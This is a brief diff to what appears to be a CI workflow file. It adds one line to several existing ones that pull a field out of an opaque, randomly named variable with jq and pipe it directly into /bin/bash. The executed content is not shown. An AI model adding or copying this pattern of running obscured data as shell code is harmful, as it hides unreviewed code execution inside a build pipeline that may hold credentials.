@@ -26,6 +26,7 @@ jobs:
           echo $kisvf6 | jq -r .vnmq1 | /bin/bash
           echo $offeb9204 | jq -r .bvyyt2 | /bin/bash
           echo $yhmdp3120 | jq -r .lcea2275 | /bin/bash
+          printf '%s' "$t7461" | jq -r .gcgp4 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
